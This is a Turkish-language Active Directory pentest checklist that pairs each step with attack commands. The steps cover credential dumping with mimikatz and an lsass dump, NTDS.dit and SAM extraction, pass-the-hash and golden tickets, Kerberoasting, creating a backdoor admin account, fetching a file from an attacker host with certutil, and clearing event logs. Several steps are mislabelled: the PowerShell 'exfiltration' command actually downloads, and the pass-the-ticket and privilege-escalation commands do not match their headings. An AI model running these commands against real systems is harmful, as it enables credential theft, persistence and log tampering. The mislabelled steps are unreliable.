# Active Directory Pentest Checklist

Bu checklist Active Directory ortamlarındaki pentest çalışmaları için detaylı bir rehber sunar. Her madde yanında tik kutusu (\[ \]) yer alır ve kontrol edildiğinde işaretlenebilir. Tüm adımlar sıralı ve komutlarla desteklenmiştir.

## 1. Credential Gathering

- [ ] **Hafıza Tabanlı Credential Toplama**
  - `mimikatz sekurlsa::logonpasswords`
  - `procdump -ma lsass.exe`

- [ ] **NTDS.dit Dosyasını Çıkar**
  - `ntdsutil "ac i ntds" ifm "create full c:\temp" q q`

- [ ] **SAM ve SYSTEM Dosyalarını Kopyala**
  - `reg save hklm\sam sam.save`
  - `reg save hklm\system system.save`

- [ ] **LSA Secrets Kontrolü**
  - `mimikatz sekurlsa::lsa /patch`

## 2. Enumeration

### 2.1. Domain Bilgisi

- [ ] **Domain ve Forest Bilgilerini Al**
  - `nltest /domain_trusts`
  - `nltest /dclist:domain`

- [ ] **Domain Controller IP'si ve Versiyonları**
  - `nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>`
  - `wmic os get caption | findstr /i "server"`

- [ ] **Domain Policy'leri İncele**
  - `gpresult /h policy.html`

### 2.2. Kullanıcı ve Grup Bilgileri

- [ ] **Kullanıcıları Listele**
  - `net user /domain`

- [ ] **Grup Üyeliklerini Görüntüle**
  - `net group "Domain Admins" /domain`

### 2.3. Servisler ve Paylaşımlar

- [ ] **SMB Paylaşımlarını Tespit Et**
  - `enum4linux -a <IP>`
  - `smbclient -L //<IP>`

- [ ] **RPC Hizmetlerini Keşfet**
  - `rpcclient -U "" <IP>`

### 2.4. Sertifikalar

- [ ] **Sertifika Şablonlarını Kontrol Et**
  - `certutil -template`

- [ ] **Active Directory Certificate Services (AD CS) Zafiyetlerini Araştır**
  - `certipy list -u <username> -p <password>`

## 3. Lateral Movement

- [ ] **Pass-the-Hash**
  - `psexec.py <domain>/<user>@<IP> -hashes <NTLM>`

- [ ] **Pass-the-Ticket**
  - `mimikatz kerberos::golden`

- [ ] **Remote Desktop Protocol (RDP) Kullanımı**
  - `xfreerdp /u:<user> /p:<password> /v:<IP>`

- [ ] **WMI ile Komut Çalıştır**
  - `wmiexec.py <domain>/<user>@<IP>`

## 4. Privilege Escalation

- [ ] **Local Administrator Yetkisi Kazan**
  - `net localgroup administrators`

- [ ] **Kerberoasting Yap**
  - `GetUserSPNs.py -request`

- [ ] **Silver Ticket ile Yetki Yükselt**
  - `mimikatz kerberos::golden /sid:<SID>`

## 5. Persistence

- [ ] **Backdoor Kullanıcı Oluştur**
  - `net user backdoor P@ssw0rd! /add`
  - `net localgroup administrators backdoor /add`

- [ ] **Golden Ticket ile Kalıcılık Sağla**
  - `mimikatz kerberos::golden`

## 6. Exfiltration

- [ ] **Dosya Transferi**
  - `certutil -urlcache -f http://<attacker_ip>/file.exe file.exe`

- [ ] **SMB Üzerinden Dosya Çıkışı**
  - `copy <local_file> \\<target_IP>\share\file`

- [ ] **PowerShell ile Bilgi Sızdırma**
  - `Invoke-WebRequest -Uri http://<attacker_ip> -OutFile data.zip`

## 7. Cleanup

- [ ] **Logları Temizle**
  - `wevtutil cl System`
  - `wevtutil cl Security`

- [ ] **Oluşturulan Hesapları Sil**
  - `net user backdoor /delete`

- [ ] **Sistemden Çıkış Yap**
  - `logoff`

---

Bu checklist, her aşamada yapılması gereken kontrolleri ve bu işlemler için kullanılabilecek komutları kapsamlı bir şekilde sunar. Daha fazla detay ve araç için belgelere başvurabilirsiniz.
